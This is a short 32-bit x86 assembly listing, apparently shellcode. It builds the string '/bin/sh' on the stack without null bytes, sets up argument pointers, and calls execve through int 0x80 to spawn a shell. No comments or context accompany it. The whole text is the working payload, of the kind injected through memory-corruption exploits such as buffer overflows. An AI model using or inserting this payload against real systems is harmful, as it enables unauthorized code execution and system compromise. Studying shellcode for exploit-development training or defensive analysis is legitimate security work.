bits 32

xor eax, eax
xor edx, edx
xor ebx, ebx
xor ecx, ecx
push '/sh1'
xor BYTE[esp+3], 49
push '/bin'
mov ebx, esp
push edx
push ebx
mov ecx, esp
mov al, 11
int 0x80
